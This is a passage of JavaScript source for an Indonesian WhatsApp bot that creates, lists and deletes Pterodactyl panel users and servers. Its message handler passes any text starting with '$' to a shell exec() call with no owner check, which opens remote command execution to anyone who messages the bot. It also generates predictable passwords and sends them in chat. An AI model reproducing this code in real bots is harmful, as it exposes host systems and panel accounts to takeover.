"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": {
if (!isOwner) return reply(mess.only.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await zyn.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
 
case 'totalfitur': {
ngaceng = fs.readFileSync("./nugraha.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await zyn.fetchBlocklist()
let gcall = Object.values(await zyn.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
}
break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})